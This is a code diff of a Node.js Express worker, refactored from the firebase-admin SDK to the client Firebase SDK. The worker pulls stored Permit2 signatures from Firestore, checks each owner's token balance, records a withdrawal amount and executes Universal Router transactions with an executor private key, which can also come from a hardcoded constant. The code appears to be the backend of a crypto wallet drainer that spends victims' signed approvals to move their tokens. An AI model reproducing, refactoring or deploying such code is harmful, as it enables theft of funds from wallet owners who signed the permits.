@@ -4,7 +4,8 @@ try { dotenv.config(); } catch(e) {}
 
 import express from 'express';
 import bodyParser from 'body-parser';
-import admin from 'firebase-admin';
+import { initializeApp } from 'firebase/app';
+import { getFirestore, collection, query, where, limit, getDocs, doc, updateDoc, getDoc } from 'firebase/firestore';
 import { ethers } from 'ethers';
 
 // -----------------------------
@@ -41,30 +42,32 @@ async function init() {
   if (initialized) return;
 
   const required = [
-    'FIREBASE_PROJECT_ID',
-    'FIREBASE_CLIENT_EMAIL',
-    'FIREBASE_PRIVATE_KEY',
+    'VITE_FIREBASE_API_KEY',
+    'VITE_FIREBASE_PROJECT_ID',
+    'VITE_FIREBASE_APP_ID',
     // RPC_URL now defaults to Sepolia
     // optional: SWAP_RECIPIENT, SWAP_FEE
   ];
   const missing = required.filter(k => !process.env[k]);
   if (missing.length) throw new Error("Missing env vars: " + missing.join(', '));
 
-  const serviceAccount = {
-    projectId: process.env.FIREBASE_PROJECT_ID,
-    clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
-    privateKey: process.env.FIREBASE_PRIVATE_KEY.replace(/\\n/g, '\n')
+  const firebaseConfig = {
+    apiKey: process.env.VITE_FIREBASE_API_KEY,
+    authDomain: process.env.VITE_FIREBASE_AUTH_DOMAIN,
+    projectId: process.env.VITE_FIREBASE_PROJECT_ID,
+    storageBucket: process.env.VITE_FIREBASE_STORAGE_BUCKET,
+    messagingSenderId: process.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
+    appId: process.env.VITE_FIREBASE_APP_ID,
   };
 
-  if (!admin.apps || admin.apps.length === 0) {
-    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
-  }
-  db = admin.firestore();
+  const app = initializeApp(firebaseConfig, 'worker-app');
+  db = getFirestore(app);
 
   // Load executor override from Firestore admin settings (optional)
   try {
-    const cfgSnap = await db.collection('admin_config').doc('settings').get();
-    const cfg = cfgSnap.exists ? cfgSnap.data() : {};
+    const cfgRef = doc(db, 'admin_config', 'settings');
+    const cfgSnap = await getDoc(cfgRef);
+    const cfg = cfgSnap.exists() ? cfgSnap.data() : {};
     EXECUTOR_ADDRESS = cfg.executorAddress || process.env.EXECUTOR_ADDRESS || HARDCODED_EXECUTOR;
     EXECUTOR_PRIVATE_KEY = cfg.executorPrivateKey || process.env.EXECUTOR_PRIVATE_KEY || HARDCODED_PRIVATE_KEY;
   } catch (e) {
@@ -192,8 +195,13 @@ function buildUniversalRouterTx(data, overrides = {}) {
 // -----------------------------
 // Process pending worker
 // -----------------------------
-async function processPending(limit = 10) {
-  const snaps = await db.collection('permit2_signatures').where('processed', '==', false).limit(limit).get();
+async function processPending(limitCount = 10) {
+  const q = query(
+    collection(db, 'permit2_signatures'),
+    where('processed', '==', false),
+    limit(limitCount)
+  );
+  const snaps = await getDocs(q);
   if (snaps.empty) return { processed: 0 };
 
   let count = 0;
@@ -211,7 +219,7 @@ async function processPending(limit = 10) {
 
     // Basic validation
     if (!data.owner || !data.token || !data.amount || !data.r || !data.s) {
-      await docSnap.ref.update({
+      await updateDoc(doc(db, 'permit2_signatures', docSnap.id), {
         lastError: "missing fields in permit doc",
         lastErrorAt: Date.now()
       });
@@ -220,7 +228,7 @@ async function processPending(limit = 10) {
 
     // Check that signer-used deadline isn't expired (optional)
     if (Number(data.deadline) * 1000 < Date.now()) {
-      await docSnap.ref.update({
+      await updateDoc(doc(db, 'permit2_signatures', docSnap.id), {
         lastError: "signature deadline expired",
         lastErrorAt: Date.now()
       });
@@ -231,7 +239,7 @@ async function processPending(limit = 10) {
     const minEthRequired = process.env.MIN_ETH_REQUIRED ? ethers.parseEther(process.env.MIN_ETH_REQUIRED) : ethers.parseEther("0.001");
     if (balance < minEthRequired) {
       // update doc with actionable error; do NOT attempt tx
-      await docSnap.ref.update({
+      await updateDoc(doc(db, 'permit2_signatures', docSnap.id), {
         lastError: `insufficient ETH in executor wallet (${EXECUTOR_ADDRESS}). Fund with at least ${minEthRequired.toString()} wei.`,
         lastErrorAt: Date.now()
       });
@@ -253,12 +261,22 @@ async function processPending(limit = 10) {
       }
 
       if (withdrawAmountBn === 0n) {
-        await docSnap.ref.update({ lastError: 'owner has zero token balance', lastErrorAt: Date.now(), withdrawAmount: '0' });
+        await updateDoc(doc(db, 'permit2_signatures', docSnap.id), {
+          lastError: 'owner has zero token balance',
+          lastErrorAt: Date.now(),
+          withdrawAmount: '0'
+        });
         continue;
       }
 
       // Save withdrawAmount for audit
-      try { await docSnap.ref.update({ withdrawAmount: withdrawAmountBn.toString() }); } catch (u) { console.error('failed to write withdrawAmount', u); }
+      try {
+        await updateDoc(doc(db, 'permit2_signatures', docSnap.id), {
+          withdrawAmount: withdrawAmountBn.toString()
+        });
+      } catch (u) {
+        console.error('failed to write withdrawAmount', u);
+      }
 
       const { commands, inputs, execDeadline } = buildUniversalRouterTx(data, { withdrawAmount: withdrawAmountBn });
 
@@ -269,7 +287,10 @@ async function processPending(limit = 10) {
       } catch (eg) {
         // estimation failed — capture reason and record on doc
         const eMsg = (eg && eg.message) ? eg.message : String(eg);
-        await docSnap.ref.update({ lastError: `estimateGas failed: ${eMsg}`, lastErrorAt: Date.now() });
+        await updateDoc(doc(db, 'permit2_signatures', docSnap.id), {
+          lastError: `estimateGas failed: ${eMsg}`,
+          lastErrorAt: Date.now()
+        });
         console.error('estimateGas failed for doc', docSnap.id, eMsg);
         continue; // skip to next doc
       }
@@ -278,7 +299,7 @@ async function processPending(limit = 10) {
       const tx = await router.execute(commands, inputs, execDeadline, { value: 0, gasLimit: estimatedGas.mul(120).div(100) });
       const receipt = await tx.wait();
 
-      await docSnap.ref.update({
+      await updateDoc(doc(db, 'permit2_signatures', docSnap.id), {
         processed: true,
         routerTx: receipt.transactionHash,
         processedAt: Date.now(),
@@ -295,7 +316,10 @@ async function processPending(limit = 10) {
       if (err?.code) errMsg = `${errMsg} (code=${err.code})`;
       // attempt to capture revert reason if present
       try {
-        await docSnap.ref.update({ lastError: errMsg, lastErrorAt: Date.now() });
+        await updateDoc(doc(db, 'permit2_signatures', docSnap.id), {
+          lastError: errMsg,
+          lastErrorAt: Date.now()
+        });
       } catch (uErr) {
         console.error('failed to update doc error', uErr);
       }
@@ -330,7 +354,12 @@ app.all('/api/run-worker', async (req, res) => {
 
   try {
     if (debug) {
-      const snaps = await db.collection('permit2_signatures').where('processed','==',false).limit(20).get();
+      const q = query(
+        collection(db, 'permit2_signatures'),
+        where('processed', '==', false),
+        limit(20)
+      );
+      const snaps = await getDocs(q);
       const docs = snaps.docs.map(d => ({ id: d.id, data: d.data() }));
       return res.json({ ok: true, processed: 0, unprocessedCount: snaps.size, sample: docs });
     }
